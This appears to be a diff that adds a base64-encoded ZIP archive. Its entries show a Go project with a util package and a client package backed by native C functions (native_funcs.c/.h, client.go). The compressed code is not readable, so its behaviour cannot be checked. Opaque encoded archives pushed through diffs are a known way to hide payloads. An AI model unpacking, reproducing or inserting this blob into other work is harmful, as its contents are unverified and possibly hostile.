+CMS+E2Wtw44muhI6BYVT/E/ZOtDDEkwqoE6RWBXmmrhFjnwpatjVCvk3sdI75ZJwrtC7cPeumu
+fMnR2iqQ91YSM+V/cKtH65VPqiy6k+reeG1g69avDBuanpdzeP8+w/ihNA89qhG8G5saQWcehh
+zLTm+1BURntCs+9+cqhpCVLfnSG8C5cQ9lelBj5O2s5xcBFZiEY1PvsfTWpfG5lY6/1Nn+lUin
+aSUEfGr9D1BLAwQKAAAAAAAAACEAAAAAAAAAAAAAAAAABAAcAHBrZy9VVAkAAwAAAAAAAAAAdX
+gLAAEEZ2UQAARTXwEAUEsDBAoAAAAAAAAAIQAAAAAAAAAAAAAAAAAJABwAcGtnL3V0aWwvVVQJ
+AAMAAAAAAAAAAHV4CwABBGdlEAAEU18BAFBLAwQUAAAACADmZTBaULWb414CAACSBQAAEAAcAH
+BrZy91dGlsL3V0aWwuZ29VVAkAA9D/iGfQ/4hndXgLAAEEZ2UQAARTXwEAlVPLbtswEDxbX7FA
+gdSKm+jhR+I0PhTNA0bTNnB6C3IQ5ZXFWhINkkoqFP33ciXKVtwGSHSwxeHODHe09Dy4jeJ1tE
+IoNc8gFoWORKFAibyBuK4gKYtYc4ITIUGnCFJVRQwbEX+AjK8RGNd5pNa8WO2KnU1H2XE8D+7m
+V19/AFe1xBXPUFcbBCI6xlhpWzADPzjxzdOSLuaLlrXkEmMtZLVHoxLD80dd3uLyuuVJXJVZJC
+ExrntUqiJLv0u9+falpaoqz3ix3mNRAbHCLWuuLrg0RrqUJiktSwSe1Aor/ogF5GKJpBntmnAo
+rIbYr7dLXuhh6AITIoPfTq9Rg2bzoMnHhdnMtuz8sc4LXL3KuRtDa264bzc3oW3N72xArzmADb
+P1ttS3+5v4yb/5HHEaye9JolDTJ6lP9WmZoRyGuzOZs0QWi1OM16rMQXTPuIx0REyuQSHmqhns
+etDfqy13yZMEpbkIUuRwLXY7x5+tKmnoNNJm6ymt4AnNpdpUhKZab9SZ5624Tkt2HIvcW5D8rR
+Q/zTx4tZfHMsG86SQYR+FoGjKWTCcsDkZjPBmeIkuS8ZgxNg3QZwzRa3s5jt/dhKfjI/MzacK1
+CfSpL7h/YJVG10ZM4XI4o6x6j2YaVGA37DLcLum+cwr1o/k7hwyLWs89GhEwmMGItHqGQe+HfR
+UMGmpdds8fXBcG0B8ePkMHwQPB4R4a1uhzbFhjgX+4+8YuGQZkuGf1Dzn4D/ayyajj4fTMcNXd
+7zVuloNB0/MLR+iK2GBU0Oi1A22oB+D/SsxTx2Oqzs8hmLhmpP8CUEsDBAoAAAAAAAAAIQAAAA
+AAAAAAAAAAAAALABwAcGtnL2NsaWVudC9VVAkAAwAAAAAAAAAAdXgLAAEEZ2UQAARTXwEAUEsD
+BBQAAAAIAOZlMFo7o18vTAEAAEMCAAAZABwAcGtnL2NsaWVudC9uYXRpdmVfZnVuY3MuaFVUCQ
+AD0P+IZ9D/iGd1eAsAAQRnZRAABFNfAQCVUctuwjAQvOcrVsqhD1WYV2jTnhCiKhJFKFDanizb
+WTcuxI5sp4i/rwNKK3HjuLMzszPaWEmdo4Tpx3KazV6ni/V4TiebjL7PljRbfS4mdDFezzZT+v
+y2mKzoC43iwFcaL5FEhMCabVGDtKaEwvvKPRLypXxR844wJcncQYulNd8oPLHNQPjOcJKOegnr
+D9M+5zIdcdEbJng/eEAuZZJwztMedjlHJHKnnO+IeD7od4fNvaMJ1A4dKH/lwOzDdc1KpKKsQN
+ZaeGU0eAPOWA++QJBqh3D0OQYuVJA6YCBMdQAjT5xWuA/hg7REKE2upBKsgV2jDJ5laBvuwt7Y
+7Ylqags58wyct7XwtUUXKe1B0jbUdQQgCmbhNle2AXt350j/H+HM4RmphY6sxjskO+3b4W9TWe
+ONMDv6g9aF3NHNUxTFqEMTgFDhguf+AlBLAwQUAAAACADmZTBazY93b6kDAAB7DgAAGQAcAHBr
+Zy9jbGllbnQvbmF0aXZlX2Z1bmNzLmNVVAkAA9D/iGfQ/4hndXgLAAEEZ2UQAARTXwEAtVdtU9
+NAEP6eX7HijDQFCTlBLVidOqJ0piJD6yfHySTXi420uU7uIsMw/Hf3Lknz3ghqPiRkX599djdX
+DONpENJlPGfwRsj5MvAOFm+LslthCelKJTVYGK/AD6mjJAzuQDgfxlf7+JhORtNz9cf70fRMPW
+dXo/FkfPEJ7k9zN3m7Vl7SuRzN0Fo649nZZ2VhGEo1Zz7EoQh+hGwOdOFGEKs7qi0LZu41C8GP
++AoWUq7FiWX9COQi9g4oX1lX4jaklxH/yai0IvVieUvuWYOX9rFLjgbE8/zBS4/aR8fs1YvXzP
+P942PP8wY2O/Q8xix/GQh5QJ9OXpDDI5VPB4FYMAGB3BXAbzB76K6YQ1dr8OOQyoCHIDkIHkmQ
+CwZ+sGSg42jAiwBdBbhA+foWuJ/YZI43CB5dVwxWfB74AXWVWKiAKywVk8INj64TOx5HMHelC0
+JGMZVxxIQRhBJ8J0PUMyChrD8PIiW096sSkks8V7CKUSbSVio2wkr02ctGs4645JQvnV8sEgja
+MI07VCVKrOVUv1CsRiYdhD619/FGEk1ljPQd9fpZNdEjo25ooB7NemftIkvDGjJ4OwQygHfpyM
+FJOnNq4jRGG516GmPfzIhL4ZO6Kk0e+NBTnkM0MrVkE0t7XXydTHLLJ9Q24W5jpmtBo6kznuLy
+9DTNpoaoi8ghlgL3CnT2zU3/ciuVKo09zMp99kwxrwS7B7vqDbF8s78X4RQhVROrK2kOKvOVLh
+uUKNzZyZX3wJaCtQVT34nENrFrYCghJA9Y8EbiUucCzaRKM6nQTLbTTFppJnWaSZVmUqKZtNBM
+ttFMttFMHkgz+ROaSRvNpErzhuekO0+GiX8+/hHDz1II1RF8BzZy/RwHVVvOeQGBblu/vB4aAX
+7z6AJ6ScOrWopNSbCdlOQb7MmI6BPptGZRHldrp27hRcy9Pm1KqUPWkz58o8tguja7SNcjN7wK
+tQ1QhcPmUWymsoHJhtFsSJKPaPFq74Ky39r5dtQNDLYx1T0nLSh14TWJ1YePo8kEZudXX75+Oo
+e+1VRahrx9xtoa1wCkDEKVrj5SOCJtG5xdnZtcz5BuMtm6yTVt5yaTrZtM/ssmP+zQKIPpOjyK
+dD3yEKlC7dzkbYdKM5WP2OTqYVO8HrXJXagbGGzd5M45aUGpCy9J/naLNwdeI4R07w7rKLqa/U
+fb/4/X/h5uFur/nV4Pf/ErhvHHv4m17e3B8+yF7O2ZKtShmR7/aQ79P8L9b1BLAwQUAAAACADm
+ZTBaytRYRiAoAACDlgAAFAAcAHBrZy9jbGllbnQvY2xpZW50LmdvVVQJAAPQ/4hn0P+IZ3V4Cw
+ABBGdlEAAEU18BAOw8aXPbRrKfyV8x0VZswqIokjosa02nfEhZ1XNsl6VNtsqrdQBiQMICARYO
+SXyO/vv2MTMYgCBFJevs+/BULosczPT09N09De3uig/u+MqdSDGOQhnnIpzNIzmDT5lwRZot4r
+F+4sa+CIp4nIdJ7EZhvhBumhQwmE+lmKdJnoyTqD2vgGu3d3fFX8J4HBW+FM+z3I9Crzd9URne
+it08vJafEXjWm261AYckzUWn3dp6vdV22vaAt8hltgUfZDxO/DCe7Hph7KYLHApmOf6KJf2au/
+l0NwgjiR9wIC3iPJzJXV96xQQHsigcM7AMwNPvPB0n8bX6CNDpaRFnbiC32vBxfJ32JkkyiWRv
+nMx251eT3SIPI8ISzvQTEO/2lZtJEWZEFw8/B0kq3CgSsyLKQ5whcneStWGnLLeWjMRTBpJN3r
+i5q0HAXIKAn386//Hzm5cXLwWSWeYahFowEn0CcOFOzqdhkGsIcTHzZCqSQHgh8DVPREaPXYIN
+X3FSJAMNz6wfieE+QXzn375JYjqVK3wZhbMwB4iIlh8GgUxRQBgnfS69ZCR2BgTjLJezi9SNM5
+h+GsHGWTgBQSJ8WNDyqZuLGynccV4AvRbixgWw8NhPbuIocVnUkKUkjHGSiy9FliPwKJmIUOO/
+tNNIDMTz52JwYBABgofZxWIuT5MoSm6yFci4sMcUDypvBEmeuAmBkZ4UGUp3ud0SPL1lefZ/xO
+7snu3weLc4DQ4pI583C2iJtVcFkN5nSPuc4qPxbE6/mVsBEoChywh2/MjbJeImBR7iBxADiQoG
+WsTE9SQwVtIEUAElIAjelxmMuGgBaGZPXExhk5DOMU/lNYoBnydIk5mBMHfTPHQj4aOUKnlbgq
+VOWD0CiPTtEUv1WZy/Ahac3Oapy0eLkuSqmIMQe5E0KiLpOTMrjGHWtQuKTEIyzfN5dry7Ownz
+aeGRAhM1PqTJFznOdwnzXS9KvN1nh4MDd7j/bOh5wbNDbzzYP5BP946kFwQHB57nPRvIvudJuR
+smvfFf3g4Gz9qwTxXHkfh0uH8Je39tt/pd8aB/u09Ep98XO2Lv1NndF092fx+IfQTx1IAYdMWD
+/iGIIwTxyoAYdkXjvz3r3z79O+iKQwbxGkGcahB3bcVpMOe3YEfOgc8/JeAH8EeLc/noHYqB9e
+iAH71N4kn90WG56iKsPnrKj/72NoyvpC/sR88qj07DNMstraJngN67TI4rywZ7aPPRZ5FVPZf5
+y9j/e5zJvHMNog5s74okJoPLn4NAf3GElySRALFIZV6kseh0cI0jHsEnXuOI30RHLXEcR4xGQj
+9xkIKo66iqqQS1y5S7JuUlVUf1uHbDyGiGsaCgbaglmUyvZdrOwWIxIHB3xThHnAxV6YfdYLt1
+Hv6vNYoK1TJMo58CxvaAXm/CCWi2Hv10iZoIyxezCOh74aYTmRugr5M4R5NRmVue7m0IgConjH
+AE/BieNFMmGizVw85KYMvzMiyFwROc0G6Np2Hk47xMj+EXhdpL3/8oJ0XkpkQ51/dL4ieli0Jc
+WT46QSQMEKe2voOTieZMla4YK6owPRxeSpiK45F4hN/gC/HpGLHWALowqCh6rIHA2F27BUiDW/
+WT+HEupu61VDZxr1+Ge6AUC+RMQi4VaAZCRL63TzSNwQO1gh5JAYYZ8JnYPxIY/vTOz04/nvwI
+Mtt/enBAEyv8HoktiKOCqMe0Hgl3Ppex39EjXRE4RhmCkswKiiZxpr4+iNQKxjKZc1sW76cy/9
+i0rpzxWMH78wj+9t3/4KjSt5ESl6939xK6idJvwlRT2Q9TcIYJBAObkhgWd2CVRd17yKkm/3m0
+enP28T8rnO/kjTElYpxKF8MNV8QQJ9bIZc3sOCXhLOv/SI8hgWjLY211vt4Rjcyer7VdEppbZK
+nKPTfjmQ2pjhQc4TRCnlUQJwJZVtGmUjncFbS6JBd9Veifxb68PQV28TNOTUIcRItukL6B4Iy+
+TSAnBAggJ41n0OBIsfmBIzrkamWaJqmDh4FtQ/8WhBICUKBWLgY98eY9SpqbXQkQ15vpot3CKX
+BgCNVxQebGmNzO3YzC2pl7BVJdpLJKV3SxmDVKn0hzDh+JSnC+z13mCpMR8hBIh6vUQ0arKWYl
+a0Im3XTM508TyG/K/QIMTMwGQQU0Sy5CDcE3YrAQKO1raU7AGYE7YQRDdzjPv93exk3ru9bkKX
+vIkQioAHjSBWgl6l+K2TyDkBzDuoYDaEqUp2g4RsM56CD6JPjlrjRtOxC9BrO8d4KiEHS2CBAm
+jAGWLI7F99lWl9MONEQ6pEJeEFezDZSIGaekjBhmV0saoCAFUJzLrCmVkbzGHNeTY7fIJBpCyn
+mTIq3wAHdIKO2ELaZpEoOp80tV4Qin127hrr1zLGvY5guQ74Rd8aUSewLJCG/GxI1u3AXjm80g
+90aXItn4YhZFBQIkBLNGgf4UXhL5kFNbva2KvEF4JYkrtSVfVi8JICE2a8BFIK0GKCave6/Pya
+10dDmnhy6njgZExmbdcJN1X6x1WKhZtyFWaJp31CtXbVldae/py0CmsCRIpexwkan3IQEmSfKn
+hM6mE4f3TjQn3HgmwmwjezI+WvAZRz9Dcm7Q6wq9f1eYDcqPMPq6B0ArlEPf7Cw9+GIe7A2cdq
+nvMAcQoAxoB+zHndFV8D5YhfHrWqY8oIr6GzUXHVeWXosnlP6/Jo112G0ofaY0MFp0SY9rxsCy
+9/fYY9YxRJJLO1iLyXriXSKyuRxjRYRGKIeJpfTRmbQAsd4vWJvBSkKnkuv+Juz81qnDZyOHEy
+MZT0D0xMvxGOxdzlFSgZUrysZacFRE2Gz1s5ueAaFhWSco5RP0Fid+N0KDW1FVGFaOBCdYgM69
+ItAgNoLQdASN/S86LMyKORWAITKMgBYQGlbDQVi8J/rZEvH6zoZDjIUJQ5EXVCbVaM0SH0vHtp
+02kShx1i47UMXN9ZJr2Xg6gCWXCffRvUEOkEqwIjyEfhfv37w/BqGdYJySFGCzOaJSzgh9CgUz
+V1LOIQwCLDMh87EyzhQln2UmU+L9eTsbfZ1/qcyJ2YSTamepSFMl2KZDNZ2qeiz27LA1ym2WzL
+DO4WZJ3EXCEzpuKc5CFU5xWAWSNUTJgWG8ppRu7JKfWSG7VYQ3xxd5YeIpQrGPJIcINxxDeqDx
+s+xIXQuNgC5vaG9nhTkYCNn1NKB7iBlNmOQufvOxmJF+LOKY6i3wGIQztz+DyXE0APAJNKIvE2
+73++pJnlzJ+KOM7HrsG559nuPhZiEaz0xMosQDCmMKh/UYKsFSXMTll8qasgQDCec1j5niUpjh
+UYBbFOlgzALTbi8QD7sGlUHC6FONXw+xd7AMO9eK7eCMcbGnlKjAeWNh/cQy772GsXZLX3H9LN
+MMi9a6BlZEDeUyv1IFq4+/rRyCRAY1E1Q0dcdXWorHRZoyckgZNQjK7dGtGyIq6TKu3YLBn/Td
+kqbWg6CG8TLQMG6GyfPHyQwr+6AyGEegrczxzqB2QZUhmHmRv+JpqsJHYPC64EOShXj1R9c5OP
+BOTlweAFgrZaknzvLHmZjCFgvAINc1BKoexAkkFAlEwPiEjTjZhxlysNzyvaYjsdHee/mJXnOm
+qLS8pvKE0JkhNZjGVKaslDFrJyuVBGOt0C+kgmMpi605SsbpEu8CL9LwQ7Z8nYcJR3m9iDS2U2
+/YCvjLAZIG1UEIlCXAf3aBGse3S2AOVsD1NSGiQ1AgjFyCwxk5fQRws2zyim5mwOzhlEdgTk7p
+p93K6aKOVr54YYA7Yqfc1uADk7pCA9MqL108oOtn6vaHrqBI5I1UExFyyOipDp8IV8VH2l2WE8
+FozErxV2FkWosYccuOZwq1JoAEcN+lvaoCoRX/TLUJChV7uFePATgNBl4pWoBejq7NZuFkitXu
+FNUDBEZjx0+VukEKiIy/SIgYsA/6YM9heOpaD0mEqou1KlyLqb0E+wBIax2ScVJMpgxZZX+s6H
+Q0hImnM3rtiBcjYe37lYMS3Iiv+hiOkkwNiULnEJHs/xV+P7cgwPftbXa0HmQMAull7QdDVuyD
+HqqYcXmmxnizVWX5Erhy4+PLdskLqjIYj57b8oBaRukqBqFAtbEbl8eN5a2+DG+36mIwUmkuZw
+51SmnjDPINT0jKjcAgfhhWbRwXVpQEYVT1U0e9wOCsGE8pKsq6+jQU3tqkRb1E7QkncaKKYchX
+q4yAyzx+MtZtD+iAPoMTB6GCmDNzJyrwpCMY3CC36/Mp8NoijMvSAcaAs7z3ASvCQWfr05NLRG
+T0vY+LPxO74cs/461u1SYoIpFNGZkGCdoin82B70gPLO11WHmrK7WiVvWUF24cEaoQVl2zazWo
+K8GSaKq6amUYDkd793o9R8PdXGmp7pTc9NTC99jRcBNiFuOGnBrqNoea9+6po26k8Bup/IZKv0
+7tNWk3Vf2HKr/OBFGagWpC3oacX0RJMqfnHpzyyo76lRYxDUs1IhXSqaSNaqk3nLddwDqpDDzW
++Kw0JRM39FDV6TA51fr1XXuFnDaL9aZmQxk8iA5yree24VMhTaIKfMvmTY2XJlS5Z9RBGclcru
+xrOnl7cnGy3NnEi0Zi0B9oQCfIkxVgTv5xdrEEhBaMxNGhKR3hyE9skcpmnDJjhgMi41f4/RqA
+TrV2xJGETwdF5h3T6DdsPjnYP9JXF9cWx0SFZVmie4wALaaP8BNJIoVJ8k2Klsfnnpl6nxnnWe
+yHqskGikAt/ShdHPIGE1ztdRQnHJP6ppXih3JKDQBp+7YtrGURkAXE8JIqgm5FZn0WIeWAGguE
+TRyuAP5/Hm/OYyYccHnuLqgRo+5rDwZDdVdWdQVxR61wSmegRtgfPH75mC0U7vrbqLJknVDdW1
+FpaTNKSy2YG5Ri7hNXVaRRKcrbMJbaG2QCOyQjHGlIVtYkHQgEJLKjexnKG0/O6pAMW1vaklMr
+jDTFMghCsEyJ3bAR+qkg5IKavEFM2i2vIToaOGXAWolIO15BLQVrfMvWVtcqGMM8WPKpf4mB2e
+N/xo/Fb79VRm77/ccq9leO9k7dQuDBtkeqltLhNU6lHsaTuhbJiZ9IrvfYT4lfuI8oNnagJHhP
+nODFJT1E7yLTGXYoYvVjURIIIi83dcf5Stthb9mhFbopwlgQja4SN6Yyz90WWxDOmi4vA+zPRv
+73YQ7Mq+Fe4s3yl6buYhl7nI5x1oapucqTokXFzlN6EoAVbFPc7c7ZpStDSEYPswYrYV5HhA7N
+W5Hb11S+MbkvoaxK8FXbbQjn8MOMSkHmPKrz1nTVSjhzRoW5lca4ZgBV1qMxaFhWidVKr2qq4c
+abshg0sG0N/aicnm0qQWVf40mMhCBEPwCiphwnY64CViikI7+msmgzbivA803+Kho1YqaLfmsR
+a6isboSXAq7RaoyyLW5hjF9qWgYYRMrgP4hndAPhiZrIN3Lsq2euYtEPEAJcfavu/zDHRgiAY2
+OvU7q1VT6pwRetdtn9rnH3aoR9yJK/4NChpGfq3qBRkhPI7zqm6wJ0I3RjCA91FX0GBhgM4Q8/
+OA+jur774zKpIbuHJyu7+jxgO7/r0nsb5nkkT2j/3ksqGPyd2m87Xlc14nZCx1ninOcsn/Jw/z
+97TsxqVVNJkYGsakVQNyJuNElgu+nsfoIc7v9xkgAMRRKEdi9JzqdJmldYn+GIIcrDDKAC9sdP
+MTjUp4BPa0+hioRaE2OD+cPUkOqMS910TUq4/8eVEO+8m86vRRrgOd1aFG0YZUxOhU8PO61h1G
+ZHHn7bIyOzm478s5tiI0jJ2iM2sPrMpK8uXsu7oGe/QvRHhZ9fdbLhI6DXyTyUmapnTUL1ns43
+zFuPhodtU+g6K6/oIrzkCkz/2ThJseu4J84ez3Tteb6gmKOKqtVoh+m3C0ujJJMQQcHHM6zarW
+G0ImFH06a8ojrct7iuNLTC9GeY5HjDpfEjYDyCa6ooq12WxIXnbygx9SxZQy0zZG/IyTGDpSqp
+CjB91QxM74ohMYmQXKv4dSZn4/miU/TAtHjD7QEhzCX1nYHz119Xb70zsDbnvRGH7cGlbmOll7
+DOuK12lZyjaR46dAUYBEAie8kQvLIawu/2a1Wf9MTdfazXIglp2gt1hYD97JAF4WagKjNsMOYX
+FYMix+6YmaTuN6+Y8K3CeQ6ZAF2q1C8afnn58d3Zux+PxTlViuiVP/G9X3/DzBIsFl9sMwWdC0
+KfXpv1sB+HL0hQYm+S9CqkqeRMU77rduMFqEFWYOnYTwqIBLm+jxPodoM2pXbDkLL7Dr2E1DkS
+O+oRPqNPF833GwZAVRatJesrxH07ia9LBkGp3NqVsrJNAmLto6/v7Gnb9HxnoGSpf4nvQlFiAO
+fFO+AB6t+dkHjn9nX90kpFQAnaGhlcaWn3+sa7lC+5ujPKSvFdWhIAX6KTRt1SbxvpNhFxzX0i
+95ujvf59BgnZkvbqDSjPxV7fNhrMUYSorgnv2tVHdfPnVM/ML13oI5vmBG7zMm7mDx6YNmlwtA
+844erT8RMrntMXf1wMwPDWvh6rV0C/bQV3/+hgB/8/wn3+Vb45qyvJqk3EVQ2tulpNCCseGA+I
+98NrIk8781+uYJSXktTUoWCr2F7Th972ZpabS38qJKChVT0bNmvsZntfv72eJAL7NY/BaoIJMy
+CcsoZbrxxzqcKq7qrixR8o7dKB8SYviIqMMxp+wVzdw9Xv0Cplm4d24lGVANn5M7eBC/ozBdKq
+oSjZAws6c8mOgKqp7jDiaGW5VT8pDbn9dgtGSbUQ6RvfRAyHwwF2mcQqNFZ5jHrt+E4/Up68Dx
+TCF6NV9ZZsZo9vXuEJnA1b4VSfSsb0VoMoZk9rQgZErr7WoSgnOt9nToPEgTNlaE61NZN7cdOM
+ESrfo6iqgu7Zq+EUEEZ8yk/msOR9qJBFU3f7t4N+H7QL2yUdM/9Mv3Zz33qnhu21Qk1fazM9la
+wqWMflHoNLpzpHi5NTqkMJ20hmFmJIbXcU1SrrPfIbHeUxbUv7Dvhdyvr+TiU1KTLqFYShnVT6
+hSkUfEsp3R+us5CAbicGlMN647++kdevxWR80425Ctrmz56bj6f08pfMy2vwDb2Xbbxgd0sq7W
+ZM3QRUkqqF8QerU2sc5+rTcpJyyBqEB3uhW2po6YjGdgjJ5R5IapBqbI6kdSbuUqBHI/PHPZZP
+Z3qYK7EaIH1JvcMY6eMR6JUtAkYgn9C7HU241rsyDa5L7ZoaV04KCNRzdFUn4tEj/qpTBIMPKR
+w+ckqsyrNqEHhBpdeXJqkKBPexgNSeAmIvXgz38aV+ap9eM28tEGyMPLp3xuBw+Tg1NpyerATC
+J127T51i7eV61KdjXOBUmtNtrn3IU9OmbksejKs/pcNJfpGRPZnzm0mocMXcd1VDFS4MkyKDWD
+Uq5Lc2KM9WGRTG6AMgo4v2dCI4IcW4hJzpgAW50k9Bj2pHZ33qNfUcj9QhbYZWFWF5prLPE5lb
+yFV6gGsUbD5fdb19ONMmvMGptIA0HK4ayzecycpT0M/oFOX/gJc5erYm3UEns5TpKHnPU2XFAc
+G3YYA5QBH5XB+DDWLs5ZButmi34mKmpv6eHAncRK2HlK9YNio+0SSP2jNvtdkro2Ub2KaFAyMl
+omYNbMPrlQ2hCobyN+rNX0sFqvBsK1JH/4TRX1HCNo0SQ+7cp0C1odAxtIscK0ixrjvUEINfcf
+KoGoJ2tV2+K8uXUo/QUyCMvnkRy7ysq/8+Fr0Xl3GDoSfFv2gJvvbwYxK5oAsg6vPIhbjOqkK1
+W9V33QwweU06JK338ss2KXUTDJaic4Zg4qsfHG43YpQC6hxpqReVudeICmK/4Atv+CqlGFOdi/
+DQLehUzOW+9mpZRdNmj2jDzSGPtO9s6W4RejK4bLdWsm8t/1YzsJGDyyxkHjITtweajTyKWjva
+6GoDOV8KtFpILwKqDhcs9B05kEvoMYju4VvaazbMjm7kLIFayNyzkhuaVnq0Lv4tOafJ3tuOvd
+xyB35V0+Ritpw76FzZXLrVa0+/p/1gOYPWYb7OjIxdrKXcm7SLYY3b7hjTFReGvHxBp8crBTf7
+/mpVue1hN1m6BrbsdP4rtYLB02f75g7t0yVeYB59rfyZsjv8W0vn4SSW/go3BdkWvrqASzt66o
+ZXJ833B+Mp3hwsXxyowjrvtFxdt3xE9QIAbW8RKBfIENV7N6DddU9oFy9sMJ3vfYcuArCCMXPj
+hV3yJ8dwX8kds8ZXukC0TMbf5ZU0TF2uh3Halp5NqUQPRGsozmsD/e/yrr25beOI/219CoSduK
+RFsSRFyS4beaJaauOpoqSS0sd0UhkiIRFjEmAI0rLH9nfv7etuDw8aVM3UM83EtigeDvfY29vn
+b0eTvDF+I0+vyiauZg7VvnkQrR7k5JyFmdE2RMjrksmWLAPnaRCPo7DMd7mWG9HBBK5YMDl8Ke
+fyI/2qTpTJ6tbGmcCF0CIjHxADAQxYIwU5EeHjUTD4A/5gFFTQyIFGSKlEkjY/7u3BgsAoMFgf
+3T8tPolPDZXBw7sBwlewlITPPz/CF7/X6qrQ378dgSr5Ukbhkart7wM99aTvP1do3BNHk+i8YI
+Ijrbci8pc8M5blg6HygXzeOnlKfEV4xZZljdUS+Dm2HVQPzpMHq48h26/IfEP/6afJjQZkIOI5
+dZPaPCNkms9EKCu1G+f+VwHZOsi4tk+PGImLaMS7kaWMqhuXhYwNL1wWGkpjsXVCVH1z88b6mo
+2vJrMyPEminjhuSJWw99zGGpwfwA2vMKcT+m2ixtFqPRFrt7zXJhHx7GVuXnR6qTI2RWN9cfPr
+TZ/71zHirZwJ2xM/o7dzs8VrvDO09fNwkUXfGTWGd3tif3TuGdn+/L9KBjNTcE+iub7ZQCZumH
+yj9TPMzX3OT1H+aAkiTt6E03iMvfILAdqqE5zivCj6zkxkGEi30HIIWCq/myFygenQDYk3Ts3u
+SA84N96h4X/heLz4EbHVhrLmWedyPo2Xao3MuE1z60W0z7Rgwv3/3TxFo2Zga7K2UHOYjh0ncH
+rnNYHJIY3YVwThndGx9WLk18J1BcGmjeGXuBrYmzdtiKTA+RUXg0cIz7QDaNMOqGcrveG5MWrm
+iQBeNDkA1B6YXADAWHAsZemu0rP0HgGu4IuWmPWplTkpb99ODgfeMXlmL6Bc02wS9ryW/a66qy
+og435KXpsNT6QfwAxpiAJ3Ht3jVcCRQT4AJFmu2W6iEzReImCQ4FVF07GCsE1SjD8gFCgbNMud
+IEj3OLoNgbkpU60/jCZilwhgScu7rVQY92P16/fwCILFJu0gZ1kcBvtmRQjgZIhESCuhfzb7Oo
+QLu8x5NMQVLXPVDIOe/whbGYpPqC8+5pae51W29Izy4i0RNUeulGnOXZi2/X2eXvVyasLNPf8y
+cYYFLifQOV6mcTPXbt2VVvBzy5HPx9rAuTd/3jQK08Ax0PPNljri+ePKIy274TJhD+vHaUVHoi
+LuEMjwJA6nzcZyNGd+s2s43y68vn6flsxsxyU8hXlDrTES1QAkbe1jULLBpns5GLKQcjjoX++A
+2B+VgE0e34Wh84U1hRYBbwAiEhzNEAa49biOwUDWp8oZDE5a1aLEBZtrUfRiVXThNfBlx7tFFA
+FkVWb0MWu1VsZkltUB7VoF8/A7XLJkbRLRYRcT8ziEW3h9evl9cEov5xw1+u3F5T/PX5xA9Enn
+6zGBjJaxh66QR+thwyKaWzcsarFR7yDdCEoB5PNlLkMU98JO7oe/uFxQaGiPZsmar9Eq3AAsiM
+LSB0KgUeAVOU4xrHaG0RdI5GMYiLlTE2qAiCMxwELp4DlSrajzMeQdcoWRPBF1aKSYxggCg5pr
+oyQXlSKCUEoBwHXwsDRpJRrfnl5c/HDRaBWn6pn+0PxzPwEsOJEQyMBNN9g4jGbE3SFuzvTcqv
+NqGfTxT1ffXZz+9eRTowhXZnHMHo+oCsci+mUVL6IxAFQu8+DbDetWIGrhtEyaiOFT2LmAXhjK
+NgwsziaQlKlTN9lGpydp5ZKRu1n5qn8Bkf0U35/lVPLSnsrVdOylWZbOhuF+/LUFFFiu5j/KLR
+u9HU0A0zNzF2+ckHANY7CKvB5FEN5ipII/3EmYoVsXlU63Oh1Kl/Ko3sUaS6aHTVz+ZOwtNk7n
+8MpsBw8U0vuC6tXI23LIBVu6VsD5GC7hajl4WhU64S13DmLhysm/WAcHud9KCAH6vmb0VLHmmB
+k6zNDcDYFSc5twsFYO2SiGGj/v7sN3nR0vgdcLKK4XYnosuAsQq4JIzlwqKLY6RBLdpcs4JG0A
+5ndZMT9qn8HwGPuUQKB5YNbo5IBlVPDa3wm8BkU6GpLzn5kjnwL1jtDlO44oTTwKvj/+x/XJyz
++fXl5dn52eW5MUQWToEFnv/fUcZfm8ikuaEQBz0DSBz2GSA39u4WOXBKKJPPkGAAzxuKUJJH2P
+B4jAlS5GEX6gB60tVga46DgBkXzeuNJw0y2iURQzkgamWphFNPMF7mfWL5zC2XsXgAYIm9Ds7e
+8/bSmwLw8eK14WlmgTwiHvBBxSc4ANvbb9o+0j0XXWYO5UJC/jS6aQFAaUD9copoi1tYYphrBV
+ZnFvb+MpMDJEIN8evIlhsVAEDr0Sh896fPLNnKG4k/k7fg0RqXdpapSfaTgiVDEjls2NXJgiBu
+WOAMXCXjlgXofA6iP484QFFgX4O3JNG+BA2rkFac2jNBkpwgXpGEoIx+OYSuJ5ybzdFm2pueON
+xGIIa4Yri48ihvAYuw4DSERigbckSrTrOxOUOVsVyAkLGNjWiL0W5EZ308QIc/iUdxuv4MZbrg
+BLAgCx+a4zy0fIvBAMcpfR4cwrMOQWAjkf63FwiSCSH5brwEldDRJEbcjjZS7TdOcRUDSCXQvW
+iTMu00Tef3Q2PmCGlACXzslhl81TxA5Pt0bat7AVqFoddnse3p+CkRYE6VdvXgmbDnG4S7smpL
+LKrS6CsoIOx8Q0dQuCtxi+rLzPNpPKEb4f3mXWsYtCHrzU3LIR9URfHulIJUFcBqzrtoWXo9FR
+8DRckXg0RizFYpQnKHEAfYYUuEMQzS+wj6qZrHNrq7lwrQhsCx2qwKpaQrpELNkjxhkG3F1rx+
+LSeYoCXjq/XUjpCUnDfAWAx9fQ17WZ8OLdK2q6VSI8fNb3tCyRTkIsbhgmSYrptmY7LD8TzlKu
+M9FtQvB2OxqOz3yAYz/tEU4ufejzB6GXx159Ny/MTUPlmU44mtXomr2r2fwh4Q0FOjC9ko8Mu9
+S6lRubBd33xoaasJkMBfX6Z+7RtJ+Tk2y624YD1PFg5S9lHH/zys+2Jn1Zk75eE+CwZemk077k
+klo/HTfdgL9Q95j/w8z8X8Np7+dgV/x3qkvL7o+oJtCOH8ao6HISLsYgNhrx4Uag8ClSA0NI76
+MCKCMUZ7UYkjT8YqDt8yOItIXIhVy5P+a1qoig9wFLSTg0fW1mQRMTItVjvGW7wr4VZ+4Q5EXx
+h3FCYU5IWRYzYF9ANNn7oIox7FBlqjP8UOTGnMa6L2FSCIFr+Bfr7eYaiG/FzADgYzk9rV2Up2
+E2tLLBY7/qhdw0POWqjaL5l+h0PNbBpyM99arRIdEHs9C33YhNOy3lP1Jz0mM/ZfSRmOvVNARp
+pl2E7XXcqVq93Zx04F5HtwGLdmWMnUqw2dHDI0Ve9aBrfMbF3SgAiTvGXqyoeSRlNih2LiaXri
+1DZ8v6JVzLD+tbDgmQv+kovYXfQY9DW+ISX0hfnLDNH0aoTpWRNEdWuNvbs+ql6J+lumfKbArH
+alYDbZkheAigUiT+mlaZq3VcRFRjSBfrIG23jF2LJky5kDnGbR/beCdwALYCoe3HE39IZVcES9
+VxQOcSMT8Wrls+tw8f5Ass35SbtI35EORkDvN4Ag211VKQjCkUF0iTQsDmYRKPmo3TGIVUh8mQ
